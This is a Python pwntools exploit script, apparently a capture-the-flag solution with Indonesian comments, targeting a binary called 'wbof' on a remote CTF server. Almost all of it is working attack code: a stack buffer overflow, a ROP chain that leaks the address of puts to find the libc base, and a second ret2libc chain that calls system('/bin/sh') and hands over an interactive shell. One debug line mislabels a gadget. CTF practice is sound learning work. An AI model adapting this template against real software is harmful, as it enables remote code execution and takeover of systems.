# Note
#   stopped with exit code -11 => Segmentation Fault

from pwn import *

# Context
context.arch = "amd64"

# Overflow Offset
BUFF_SIZE = 28
SIZE_TOOV = 160

# Challenge
wbof = ELF("./wbof")
libc = ELF("./libc.so")

# p = wbof.process()
p = remote("ctf.serangkota.go.id", 9980)

# Check apakah sudah tersedia teks whut ...
p.recvuntil("whut time is now ? ")
log.info("Sending buffer " + str(SIZE_TOOV))
p.sendline(str(SIZE_TOOV))

# Membuat ROP (Return Oriented Progamming)
rop = ROP(wbof)
rop.call(wbof.symbols[b'puts'], [wbof.got[b'puts']])
rop.call(wbof.symbols[b'_start'])
# Fungsi ROP yang saya terapkan adalah untuk mengambil address puts untuk digunakan sebagai Base-Address pada libc

payload = [
    b"A" * BUFF_SIZE,
    rop.chain()
]

# Send Payload
payload = b"".join(payload)
p.sendline(payload)

log.success("Payload : " + str(payload))
log.success("Payload Size : " + str(len(payload)))
log.success(hexdump(payload))

# Mengambil Address dari puts pada wbof
puts = p.recvuntil("wb0f~\n").rstrip()
puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
log.success(f"Puts address : {hex(puts)}")
# ========================================================================================
p.recvuntil("whut time is now ? ")
log.info("Sending buffer " + str(SIZE_TOOV))
p.sendline(str(SIZE_TOOV))

# Determined
libc.address = puts - libc.symbols[b'puts']
log.info(f"libc base address determined {hex(libc.address)}")
# ========================================================================================

RET = (rop.find_gadget(['ret']))[0]
POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0]

BINSH = next(libc.search("/bin/sh"))
SYSTEM = libc.sym[b"system"]

log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))
log.info("ret %s " % hex(RET))
log.info("pop rdi %s " % hex(RET))

rop2 = (b"A" * 28) + p64(RET) + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

# Send Payload
payload = rop2
p.sendline(payload)

log.success("Payload : " + str(payload))
log.success("Payload Size : " + str(len(payload)))
log.success(hexdump(payload))
puts = p.recvuntil("\n")

p.interactive()
